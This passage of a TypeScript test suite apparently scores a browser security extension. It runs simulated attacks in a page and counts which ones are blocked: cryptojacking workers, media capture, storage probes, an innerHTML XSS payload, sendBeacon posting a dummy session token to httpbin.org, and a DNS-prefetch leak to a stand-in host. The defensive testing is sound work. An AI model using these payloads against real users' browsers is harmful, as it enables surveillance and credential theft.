              w.onmessage = (e) => { results.push(e.data); if (results.length === workerCount) { clearTimeout(timeout); workers.forEach((w2) => w2.terminate()); URL.revokeObjectURL(url); const totalRate = results.reduce((s, r) => s + r.hashRate, 0); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Multi-worker mining: ${workerCount} workers, ${totalRate} h/s combined` }); } };
              w.onerror = () => { clearTimeout(timeout); workers.forEach((w2) => w2.terminate()); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "Multi-worker mining blocked" }); };
              w.postMessage({ duration: 200, id: i });
            });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Multi-worker mining blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "cryptojacking-wasm",
    name: "WASM Mining Capability",
    category: "cryptojacking",
    description: "Tests WebAssembly execution capability for high-performance mining",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (typeof WebAssembly === "undefined") return { blocked: true, executionTime: performance.now() - startTime, details: "WebAssembly not supported" };
          const wasmBinary = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,0x01,0x60,0x02,0x7f,0x7f,0x01,0x7f,0x03,0x02,0x01,0x00,0x07,0x07,0x01,0x03,0x61,0x64,0x64,0x00,0x00,0x0a,0x09,0x01,0x07,0x00,0x20,0x00,0x20,0x01,0x6a,0x0b]);
          const module = await WebAssembly.compile(wasmBinary);
          const instance = await WebAssembly.instantiate(module);
          const add = instance.exports.add as (a: number, b: number) => number;
          let count = 0;
          const s = performance.now();
          while (performance.now() - s < 100) { for (let i = 0; i < 1000; i++) { add(count, i); count++; } }
          return { blocked: false, executionTime: performance.now() - startTime, details: `WASM mining: ${Math.round(count / 100 * 1000)} ops/s` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `WASM blocked: ${error?.message}` };
        }
      }),
  },

  // --- Privacy ---
  {
    id: "privacy-geolocation",
    name: "Geolocation Tracking",
    category: "privacy",
    description: "Attempts to access precise device location via Geolocation API",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!("geolocation" in navigator)) return { blocked: true, executionTime: performance.now() - startTime, details: "Geolocation API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Geolocation timed out - permission dialog pending" }), 3000);
          navigator.geolocation.getCurrentPosition(
            (pos) => { clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Geolocation: accuracy ${pos.coords.accuracy}m` }); },
            (err) => { clearTimeout(timeout); resolve({ blocked: err.code === err.PERMISSION_DENIED, executionTime: performance.now() - startTime, details: err.code === err.PERMISSION_DENIED ? "Geolocation permission denied" : `Geolocation error: ${err.message}` }); },
            { timeout: 2500 }
          );
        });
      }),
  },
  {
    id: "privacy-battery",
    name: "Battery Info Extraction",
    category: "privacy",
    description: "Extracts battery status for device fingerprinting",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        const nav = navigator as any;
        if (!nav.getBattery) return { blocked: true, executionTime: performance.now() - startTime, details: "Battery API not available" };
        try {
          const battery = await nav.getBattery();
          return { blocked: false, executionTime: performance.now() - startTime, details: `Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? "charging" : "discharging"})` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Battery blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "privacy-motion",
    name: "Device Motion Tracking",
    category: "privacy",
    description: "Monitors device accelerometer/gyroscope",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          let collected = false;
          const handler = (e: DeviceMotionEvent) => { if (!collected && e.acceleration) { collected = true; window.removeEventListener("devicemotion", handler); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Motion data: x=${e.acceleration.x?.toFixed(2)}` }); } };
          window.addEventListener("devicemotion", handler);
          setTimeout(() => { window.removeEventListener("devicemotion", handler); if (!collected) resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Device motion listener set (no data - desktop?)" }); }, 1000);
        });
      }),
  },
  {
    id: "privacy-media-devices",
    name: "Media Device Enumeration",
    category: "privacy",
    description: "Enumerates cameras and microphones for device fingerprinting",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!navigator.mediaDevices?.enumerateDevices) return { blocked: true, executionTime: performance.now() - startTime, details: "Media Devices API not available" };
          const devices = await navigator.mediaDevices.enumerateDevices();
          const counts = { audioinput: 0, audiooutput: 0, videoinput: 0 };
          for (const d of devices) { if (d.kind in counts) counts[d.kind as keyof typeof counts]++; }
          return { blocked: false, executionTime: performance.now() - startTime, details: `Media devices: ${counts.videoinput} cameras, ${counts.audioinput} mics` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Media enumeration blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "privacy-storage-estimate",
    name: "Storage Estimation Probe",
    category: "privacy",
    description: "Probes storage usage patterns for user profiling",
    severity: "low",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!navigator.storage?.estimate) return { blocked: true, executionTime: performance.now() - startTime, details: "Storage API not available" };
          const est = await navigator.storage.estimate();
          return { blocked: false, executionTime: performance.now() - startTime, details: `Storage: ${((est.usage ?? 0) / 1024 / 1024).toFixed(2)}MB used of ${((est.quota ?? 0) / 1024 / 1024 / 1024).toFixed(2)}GB` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Storage estimation blocked: ${error?.message}` };
        }
      }),
  },

  // --- Media ---
  {
    id: "media-screen-capture",
    name: "Screen Capture Attack",
    category: "media",
    description: "Captures user screen via getDisplayMedia API",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!navigator.mediaDevices?.getDisplayMedia) return { blocked: true, executionTime: performance.now() - startTime, details: "Screen capture API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Screen capture permission pending" }), 3000);
          navigator.mediaDevices.getDisplayMedia({ video: true as any }).then((stream) => { clearTimeout(timeout); stream.getTracks().forEach((t) => t.stop()); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Screen capture successful" }); }).catch((err) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError" || err.name === "SecurityError", executionTime: performance.now() - startTime, details: err.name === "NotAllowedError" ? "Screen capture blocked" : `Screen capture error: ${err.message}` }); });
        });
      }),
  },
  {
    id: "media-audio-capture",
    name: "Audio Recording Attack",
    category: "media",
    description: "Records user audio via getUserMedia",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!navigator.mediaDevices?.getUserMedia) return { blocked: true, executionTime: performance.now() - startTime, details: "Audio capture API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Audio capture permission pending" }), 3000);
          navigator.mediaDevices.getUserMedia({ audio: true }).then((stream) => { clearTimeout(timeout); stream.getTracks().forEach((t) => t.stop()); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Audio capture successful" }); }).catch((err) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError" || err.name === "SecurityError", executionTime: performance.now() - startTime, details: err.name === "NotAllowedError" ? "Audio capture blocked" : `Audio error: ${err.message}` }); });
        });
      }),
  },
  {
    id: "media-device-capture",
    name: "Full Media Capture Attack",
    category: "media",
    description: "Captures both audio and video streams simultaneously",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!navigator.mediaDevices?.getUserMedia) return { blocked: true, executionTime: performance.now() - startTime, details: "Media capture API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Media capture permission pending" }), 3000);
          navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then((stream) => { clearTimeout(timeout); stream.getTracks().forEach((t) => t.stop()); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Full media capture successful" }); }).catch((err) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError" || err.name === "SecurityError", executionTime: performance.now() - startTime, details: err.name === "NotAllowedError" ? "Media capture blocked" : `Media error: ${err.message}` }); });
        });
      }),
  },

  // --- Storage ---
  {
    id: "storage-localstorage-exfil",
    name: "localStorage Exfiltration",
    category: "storage",
    description: "Exfiltrates sensitive data via localStorage",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const key = `battacker_${Date.now()}`;
          const val = JSON.stringify({ email: "user@example.com", sessionToken: "xyz789" });
          localStorage.setItem(key, val);
          const retrieved = localStorage.getItem(key);
          localStorage.removeItem(key);
          return { blocked: retrieved !== val, executionTime: performance.now() - startTime, details: retrieved === val ? `localStorage exfil: ${val.length} bytes` : "localStorage retrieval failed" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `localStorage blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "storage-sessionstorage-exfil",
    name: "sessionStorage Exfiltration",
    category: "storage",
    description: "Exfiltrates session data via sessionStorage",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const key = `battacker_session_${Date.now()}`;
          const val = JSON.stringify({ credentials: "username:password_hash", csrfToken: "csrf_value" });
          sessionStorage.setItem(key, val);
          const retrieved = sessionStorage.getItem(key);
          sessionStorage.removeItem(key);
          return { blocked: retrieved !== val, executionTime: performance.now() - startTime, details: retrieved === val ? `sessionStorage exfil: ${val.length} bytes` : "sessionStorage retrieval failed" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `sessionStorage blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "storage-event-spy",
    name: "Storage Event Spying",
    category: "storage",
    description: "Spies on storage events to intercept cross-tab data sharing",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const key = `battacker_spy_${Date.now()}`;
          window.addEventListener("storage", () => {});
          localStorage.setItem(key, "test");
          await new Promise((r) => setTimeout(r, 100));
          localStorage.removeItem(key);
          return { blocked: false, executionTime: performance.now() - startTime, details: "Storage event listener set (single-tab test)" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Storage spy blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "storage-quota-exhaustion",
    name: "Storage Quota Exhaustion",
    category: "storage",
    description: "Exhausts storage quota as denial-of-service",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          let bytes = 0;
          const prefix = "battacker_quota_";
          for (let i = 0; i < 20; i++) {
            try { const data = "x".repeat(1024 * 100); localStorage.setItem(`${prefix}${i}`, data); bytes += data.length; } catch { break; }
          }
          for (let i = 0; i < 20; i++) { try { localStorage.removeItem(`${prefix}${i}`); } catch { /* */ } }
          return { blocked: false, executionTime: performance.now() - startTime, details: `Storage quota probe: ${bytes} bytes stored` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Storage quota blocked: ${error?.message}` };
        }
      }),
  },

  // --- Worker ---
  {
    id: "worker-shared-worker",
    name: "SharedWorker Persistence",
    category: "worker",
    description: "Uses SharedWorker for persistent cross-tab data coordination",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const worker = new SharedWorker("data:application/javascript,self.onconnect=function(e){var p=e.ports[0];p.onmessage=function(ev){p.postMessage({response:'ack',data:ev.data});};p.start();}", "battacker_shared");
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "SharedWorker timed out" }), 2000);
            worker.port.onmessage = () => { clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "SharedWorker communication successful" }); };
            worker.onerror = () => { clearTimeout(timeout); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "SharedWorker blocked" }); };
            worker.port.start();
            worker.port.postMessage({ type: "test" });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `SharedWorker blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "worker-service-worker-registration",
    name: "Service Worker Registration",
    category: "worker",
    description: "Registers Service Worker for network interception",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!("serviceWorker" in navigator)) return { blocked: true, executionTime: performance.now() - startTime, details: "Service Worker API not available" };
        const code = "self.addEventListener('install',()=>self.skipWaiting());";
        const blob = new Blob([code], { type: "application/javascript" });
        const url = URL.createObjectURL(blob);
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => { URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Service Worker registration pending" }); }, 2000);
          navigator.serviceWorker.register(url, { scope: "/" }).then((reg) => { clearTimeout(timeout); reg.unregister(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Service Worker registered" }); }).catch((err) => { clearTimeout(timeout); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `Service Worker blocked: ${err.message}` }); });
        });
      }),
  },
  {
    id: "worker-spawning-chain",
    name: "Worker Spawning Chain",
    category: "worker",
    description: "Creates nested worker hierarchy for hidden command channels",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const code = `self.onmessage=function(e){const l=e.data.level||0;if(l<3){const c='self.onmessage=function(e){self.postMessage({level:e.data.level});};';const b=new Blob([c],{type:"application/javascript"});const u=URL.createObjectURL(b);const w=new Worker(u);w.onmessage=function(ev){self.postMessage({nested:true,level:ev.data.level});};w.postMessage({level:l+1});}else{self.postMessage({maxDepth:true,level:l});}};`;
          const blob = new Blob([code], { type: "application/javascript" });
          const url = URL.createObjectURL(blob);
          const worker = new Worker(url);
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Worker chain timed out" }); }, 2000);
            worker.onmessage = (e) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Worker chain: depth ${e.data.level || 0}` }); };
            worker.onerror = (err) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `Worker chain blocked: ${err.message}` }); };
            worker.postMessage({ level: 0 });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Worker chain blocked: ${error?.message}` };
        }
      }),
  },

  // --- Injection ---
  {
    id: "injection-clipboard-read",
    name: "Silent Clipboard Read",
    category: "injection",
    description: "Silently reads clipboard contents for password/token harvesting",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!navigator.clipboard?.readText) return { blocked: true, executionTime: performance.now() - startTime, details: "Clipboard read API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Clipboard read pending" }), 2000);
          navigator.clipboard.readText().then((text) => { clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Clipboard read: ${text.length} chars` }); }).catch((err) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError" || err.name === "SecurityError", executionTime: performance.now() - startTime, details: `Clipboard read ${err.name === "NotAllowedError" ? "blocked" : "error"}: ${err.message}` }); });
        });
      }),
  },
  {
    id: "injection-fullscreen-phishing",
    name: "Fullscreen Phishing Overlay",
    category: "injection",
    description: "Hijacks fullscreen to display fake authentication dialogs",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        const el = document.documentElement;
        if (!el.requestFullscreen && !(el as any).webkitRequestFullscreen) return { blocked: true, executionTime: performance.now() - startTime, details: "Fullscreen API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Fullscreen request pending" }), 2000);
          const request = el.requestFullscreen?.() || (el as any).webkitRequestFullscreen?.();
          if (request) {
            request.then(() => { if (document.fullscreenElement) document.exitFullscreen?.().catch(() => {}); clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Fullscreen takeover successful" }); }).catch((err: any) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError", executionTime: performance.now() - startTime, details: `Fullscreen ${err.name === "NotAllowedError" ? "blocked" : "failed"}: ${err.message}` }); });
          }
        });
      }),
  },
  {
    id: "injection-innerhtml",
    name: "innerHTML Malicious Injection",
    category: "injection",
    description: "Injects malicious HTML/scripts via innerHTML manipulation",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const container = document.createElement("div");
          container.style.display = "none";
          document.body.appendChild(container);
          container.innerHTML = '<img src=x onerror="alert(\'XSS\')" /> <script>console.log("injected")<\/script>';
          const hasScript = container.querySelector("script");
          const hasImg = container.querySelector("img[onerror]");
          document.body.removeChild(container);
          return { blocked: !(hasScript || hasImg), executionTime: performance.now() - startTime, details: (hasScript || hasImg) ? "innerHTML injection: dangerous elements persisted" : "innerHTML injection: content stripped" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `innerHTML blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "injection-dynamic-script",
    name: "Dynamic Script Execution",
    category: "injection",
    description: "Executes arbitrary JavaScript via Function constructor or eval()",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          try {
            const fn = new Function("return 'Function constructor works'");
            if (fn() === "Function constructor works") return { blocked: false, executionTime: performance.now() - startTime, details: "Function constructor execution successful" };
          } catch { /* */ }
          try {
            eval("var testEval = 'eval works'");
            if (typeof (window as any).testEval !== "undefined") return { blocked: false, executionTime: performance.now() - startTime, details: "eval() execution successful" };
          } catch { /* */ }
          return { blocked: true, executionTime: performance.now() - startTime, details: "Dynamic script execution blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Dynamic script blocked: ${error?.message}` };
        }
      }),
  },

  // --- Covert ---
  {
    id: "covert-beacon-api",
    name: "Beacon API Data Exfiltration",
    category: "covert",
    description: "Uses sendBeacon() for background data exfiltration",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          if (!navigator.sendBeacon) return { blocked: true, executionTime: performance.now() - startTime, details: "Beacon API not available" };
          const success = navigator.sendBeacon("https://httpbin.org/post", JSON.stringify({ type: "beacon_exfil", sessionToken: "abc123", userId: "user@example.com" }));
          return { blocked: !success, executionTime: performance.now() - startTime, details: success ? "Beacon API exfiltration successful" : "Beacon API call failed" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Beacon API blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "covert-dns-prefetch-leak",
    name: "DNS Prefetch Covert Channel",
    category: "covert",
    description: "Establishes timing-based covert communication via DNS prefetch",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const link = document.createElement("link");
          link.rel = "dns-prefetch";
          link.href = "https://6c65616b65645f73657373696f6e.leak.test/";
          document.head.appendChild(link);
          await new Promise((r) => setTimeout(r, 100));
          document.head.removeChild(link);
          return { blocked: false, executionTime: performance.now() - startTime, details: "DNS prefetch leak: covert channel established" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `DNS prefetch blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "covert-webtransport",
    name: "WebTransport Tunnel",
    category: "covert",
    description: "Establishes UDP-based tunnel via WebTransport API",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        const WT = (globalThis as any).WebTransport;
        if (!WT) return { blocked: true, executionTime: performance.now() - startTime, details: "WebTransport API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebTransport timed out" }), 2000);
          try {
            const t = new WT("https://webtransport-test.example.com");
            t.ready.then(() => { clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebTransport tunnel established" }); }).catch((e: Error) => { clearTimeout(timeout); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `WebTransport blocked: ${e.message}` }); });
          } catch (e: any) { clearTimeout(timeout); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `WebTransport init failed: ${e?.message}` }); }
        });
      }),
  },
  {
    id: "covert-webrtc-datachannel",
    name: "WebRTC DataChannel P2P",
    category: "covert",
    description: "Creates peer-to-peer communication channel via WebRTC",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        const PC = (window as any).RTCPeerConnection || (window as any).webkitRTCPeerConnection;
        if (!PC) return { blocked: true, executionTime: performance.now() - startTime, details: "WebRTC API not available" };
        try {
          const pc = new PC({ iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }] });
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { pc.close(); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebRTC DataChannel timed out" }); }, 3000);
            const dc = pc.createDataChannel("exfil", { ordered: false });
            dc.onopen = () => { clearTimeout(timeout); dc.send(JSON.stringify({ type: "exfil" })); pc.close(); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebRTC DataChannel established" }); };
            dc.onerror = () => { clearTimeout(timeout); pc.close(); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "WebRTC DataChannel error" }); };
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `WebRTC blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "covert-image-load-timing",
    name: "Image Load Timing Covert Channel",
    category: "covert",
    description: "Uses HTTP image load timing patterns for side-channel leakage",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        const timings: number[] = [];
        for (let i = 0; i < 3; i++) {
          const img = document.createElement("img");
          const loadStart = performance.now();
          await new Promise<void>((r) => {
            img.onload = () => { timings.push(performance.now() - loadStart); r(); };
            img.onerror = () => { timings.push(performance.now() - loadStart); r(); };
            img.src = `https://httpbin.org/image/png?cb=${i}_${Date.now()}`;
            setTimeout(() => { timings.push(performance.now() - loadStart); r(); }, 1000);
          });
        }
        const avg = timings.reduce((a, b) => a + b, 0) / timings.length;
        return { blocked: false, executionTime: performance.now() - startTime, details: `Image timing channel: avg ${avg.toFixed(0)}ms` };
      }),
  },

  // --- Advanced ---
  {
    id: "advanced-form-submit-hijack",
    name: "Form Submission Hijacking",
    category: "advanced",
    description: "Intercepts form submission events to steal credentials",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const form = document.createElement("form");
          form.style.display = "none";
          form.method = "POST";
          form.action = "https://httpbin.org/post";
          const input = document.createElement("input");
          input.type = "password"; input.name = "password"; input.value = "secret";
          form.appendChild(input);
          document.body.appendChild(form);
          let hijacked = false;
          form.submit = function () { hijacked = true; };
          form.submit();
          document.body.removeChild(form);
          return { blocked: !hijacked, executionTime: performance.now() - startTime, details: hijacked ? "Form submission hijacking successful" : "Form hijacking blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Form hijack blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-prototype-pollution",
    name: "Prototype Chain Pollution",
    category: "advanced",
    description: "Pollutes Object.prototype to inject malicious properties",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          Object.defineProperty(Object.prototype, "__battacker_polluted__", { value: true, writable: true, enumerable: false, configurable: true });
          const test = {} as any;
          const polluted = test.__battacker_polluted__ === true;
          delete (Object.prototype as any).__battacker_polluted__;
          return { blocked: !polluted, executionTime: performance.now() - startTime, details: polluted ? "Prototype pollution successful" : "Prototype pollution blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Prototype pollution blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-request-header-injection",
    name: "Request Header Injection",
    category: "advanced",
    description: "Injects custom headers into requests",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://httpbin.org/get", { method: "GET", headers: { "X-Custom-Header": "injected", "X-User-Data": "leaked-session" }, mode: "no-cors" }).catch(() => null);
          return { blocked: false, executionTime: performance.now() - startTime, details: response ? "Request header injection: custom headers sent" : "Request header injection attempted" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Header injection blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-mutation-observer-xss",
    name: "MutationObserver DOM XSS",
    category: "advanced",
    description: "Exploits DOM modifications via MutationObserver for XSS",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const container = document.createElement("div");
          container.style.display = "none";
          document.body.appendChild(container);
          let detected = false;
          const observer = new MutationObserver((mutations) => { for (const m of mutations) { for (const n of Array.from(m.addedNodes)) { if (n.nodeType === Node.ELEMENT_NODE && (n as Element).tagName === "SCRIPT") detected = true; } } });
          observer.observe(container, { childList: true, subtree: true });
          const script = document.createElement("script");
          script.textContent = "console.log('xss')";
          container.appendChild(script);
          observer.disconnect();
          document.body.removeChild(container);
          return { blocked: !detected, executionTime: performance.now() - startTime, details: detected ? "MutationObserver XSS: script injected" : "MutationObserver XSS blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `MutationObserver XSS blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-cors-preflight-leak",
    name: "CORS Preflight Timing Leak",
    category: "advanced",
    description: "Extracts information from CORS preflight request timing",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const preflightStart = performance.now();
          const response = await fetch("https://httpbin.org/post", { method: "POST", headers: { "Content-Type": "application/json", "X-Custom": "value" }, body: JSON.stringify({ test: "data" }) });
          const timing = performance.now() - preflightStart;
          return { blocked: false, executionTime: performance.now() - startTime, details: `CORS preflight timing: ${timing.toFixed(0)}ms` };
        } catch {
          return { blocked: true, executionTime: performance.now() - startTime, details: "CORS preflight blocked" };
        }
      }),
  },
];

// ============================================================================
// Test Infrastructure
// ============================================================================

interface TestContext {
  context: BrowserContext;
  page: Page;
  server: Server;
  serverPort: number;
}

function startTestServer(): Promise<{ server: Server; port: number }> {
  return new Promise((resolve) => {
    const testPageContent = readFileSync(TEST_PAGE_PATH, "utf-8");
    const server = createServer((req, res) => {
      if (req.url === "/" || req.url === "/test-page.html") {
        res.writeHead(200, { "Content-Type": "text/html" });
        res.end(testPageContent);
      } else {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ ok: true }));
      }
    });
    server.listen(0, "127.0.0.1", () => {
      const addr = server.address();
      const port = typeof addr === "object" && addr ? addr.port : 3456;
      resolve({ server, port });
    });
  });
}

async function setupBrowser(): Promise<TestContext> {
  if (!existsSync(AUDIT_EXTENSION_PATH)) {
    throw new Error(`Audit extension not found at ${AUDIT_EXTENSION_PATH}. Run: pnpm --filter @pleno-audit/audit-extension build`);
  }

  const { server, port } = await startTestServer();

  const context = await chromium.launchPersistentContext("", {
    headless: false,
    args: [
      "--headless=new",
      `--disable-extensions-except=${AUDIT_EXTENSION_PATH}`,
      `--load-extension=${AUDIT_EXTENSION_PATH}`,
      "--no-first-run",
      "--disable-default-apps",
    ],
  });

  // Wait for extension service worker to be ready
  for (let attempt = 0; attempt < 15; attempt++) {
    await new Promise((r) => setTimeout(r, 500));
    const serviceWorkers = context.serviceWorkers();
    if (serviceWorkers.some((sw) => sw.url().includes("background"))) break;
  }

  const page = await context.newPage();
  return { context, page, server, serverPort: port };
}

// ============================================================================
// Scoring
// ============================================================================

interface TestResultEntry {
  attack: AttackDef;
  result: AttackResult;
}

function calculateScore(results: TestResultEntry[]): {
  totalScore: number;
  maxScore: number;
  grade: Grade;
  categories: CategoryScore[];
} {
  const byCategory = new Map<AttackCategory, TestResultEntry[]>();
  for (const r of results) {
    const existing = byCategory.get(r.attack.category) ?? [];
    existing.push(r);
    byCategory.set(r.attack.category, existing);
  }

  const categories: CategoryScore[] = [];
  let weightedScore = 0;
  let totalWeight = 0;

  for (const [category, entries] of byCategory) {
    let score = 0;
    let maxScore = 0;
    let blocked = 0;

    for (const entry of entries) {
      const testMax = SEVERITY_SCORES[entry.attack.severity];
      maxScore += testMax;
      if (entry.result.blocked) {
        score += testMax;
        blocked++;
      }
    }

    categories.push({ category, score, maxScore, blocked, total: entries.length });

    const weight = CATEGORY_WEIGHTS[category];
